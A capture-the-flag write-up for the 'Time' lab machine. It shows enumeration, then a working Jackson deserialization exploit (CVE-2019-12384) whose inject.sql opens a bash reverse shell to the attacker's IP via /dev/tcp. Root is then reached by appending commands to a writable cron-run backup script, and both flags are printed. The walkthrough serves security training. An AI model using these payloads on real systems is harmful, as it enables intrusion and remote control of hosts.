# Time

Machine IP:  10.10.10.214 

## Initial enumeration

Quick scan: `nmap -sC -sV 10.10.10.214`

```s
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Online JSON parser
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
The response returned 

Comprehensive scan on all ports: `nmap -sC -sV -p- 10.10.10.214`

Dirbuster report: The host rejected a lot of requests after a while.

## Port 80

After a lot of things tried, it didn't work out. I was possibly in the right direction trying to inject things through JSON but here's the catch: why was I giving correct/good input? Applications break on bad inputs, not on good ones. Developers forget to consider bad inputs or edge test cases, they are your go-to.

```s
Input to Validator(beta)

a

Output: Validation failed: Unhandled Java exception: com.fasterxml.jackson.core.JsonParseException: Unrecognized token 'a': was expecting ('true', 'false' or 'null')
```

A points about this:

- Java backend (evident by now)

- The validator is expecting boolean fields (true, false, or null).

- class information is being exposed.

- Look at this: https://github.com/jas502n/CVE-2019-12384

```s
Input to validator(beta)

{"name":"testname","age":12}

Output
Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.MismatchedInputException: Unexpected token (START_OBJECT), expected START_ARRAY: need JSON Array to contain As.WRAPPER_ARRAY type information for class java.lang.Object
```

[**MismatchedInputException**](https://fasterxml.github.io/jackson-databind/javadoc/2.9/com/fasterxml/jackson/databind/exc/MismatchedInputException.html): The input is not mapping to target definition. From this [stackoverflow](https://stackoverflow.com/questions/49822202/com-fasterxml-jackson-databind-exc-mismatchedinputexception-unexpected-token-s) thread, it is clear that this is expecting a JSON array instead of an object.



## Final Foothold

- Clone https://github.com/jas502n/CVE-2019-12384.git that takes advantage of deserialization vulnerability in Jackson.

- The `inject.sql` is modified as:

```s
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
        String[] command = {"bash", "-c", cmd};
        java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
        return s.hasNext() ? s.next() : "";  }
$$;
CALL SHELLEXEC('setsid bash -i &>/dev/tcp/10.10.14.137/12345 0>&1 &')
```

Or `setsid` is used to communicate the output to IP `10.10.14.137` at port `12345`.

- Host the content (`python -m SimpleHTTPServer`).

- Open a listener on port `12345` (`nc -lnv -p 12345`)

- Input this to Validate (beta!) on the website:

```s

[
    "ch.qos.logback.core.db.DriverManagerConnectionSource",
    {
        "url": "jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http:\/\/10.10.14.137:8000\/inject.sql'"
    }
]
```

So we pick `inject.sql` from port 8000 server and serve the shell to port `12345` using `setsid` in `inject.sql`. An initial shell is received at port `12345`.


## User flag

The initial shell is of `pericles@time` in `/var/www/html`. The first thing is to upgrade the shell: `python3 -c 'import pty; pty.spawn("/bin/bash")'`

User flag: `7f971b636867f38faf2a1cbc65a01029` to be found in `/home/pericles`. The thing to note is `HOME` is not set so `cd ` doesn't really work.


## Enumeration

- The user `pericles` has a certain `snap` which has `lxd` (which has an exploit somewhere I remember). In `/home/pericles/snap/lxd/17886/.config/lxc/`, there be a `config.yml` that goes as follows:

```s
default-remote: local
remotes:
  images:
    addr: https://images.linuxcontainers.org
    protocol: simplestreams
    public: true
  local:
    addr: unix://
    public: false
aliases: {}
```
Also, another directory `/home/pericles/snap/lxd/17936/.config/lxc/` also has the same thing. And there is another link `current->17936` in `snap` itself that points to the directory `17936`.


- Also, in `/`, there's another `snap` directory. Snap is a package manager.

- `srv` is in `/` is an empty directory and `swap.img` is a very big file and probably the swap space. 

- `test1` is a file, and of 0 bytes.

- `snap version` > 2.37.1 (exactly 2.47.1) and thus dirty-sock exploit will not work in this case.

There's a certain writable file `timer_backup.sh` belonging to the user `pericles` in `/usr/bin/`:

```
#!/bin/bash
/usr/bin/chown root.root /tmp/.../root.sh 
/usr/bin/chmod 4777  /tmp/.../root.sh

zip -r website.bak.zip /var/www/html && mv website.bak.zip /root/backup.zip
```

And after a while back, this changed to:

```
#!/bin/bash
/usr/bin/chown root.root /tmp/.../m
/usr/bin/chmod 4755  /tmp/.../m
zip -r website.bak.zip /var/www/html && mv website.bak.zip /root/backup.zip
```

I think I observed another user doing stuff. Thus, this is the real script in my opinion.

```
#!/bin/bash
zip -r website.bak.zip /var/www/html && mv website.bak.zip /root/backup.zip
```
Let us assume some cron job is doing things here, that's what we will try.

## Root flag

Create a file `things.sh` in `/home/pericles` with `cat /root/root.txt > /home/pericles/flag.txt`. Now `echo "sh /home/pericles/things.sh" >> /usr/bin/timer_backup.sh`. Wait a while and the cron job executes this script and there will be a `flag.txt` in `/home/pericles` with the root flag.

Root flag: `20ab60d48cfcb908c96175daed36b121`

## Privilege escalation

One thing is to write everything inside a script and make that run by the cron job running the timer. You can try to do things like `/bin/bash -i` inside the script and let the cron job run it as root.
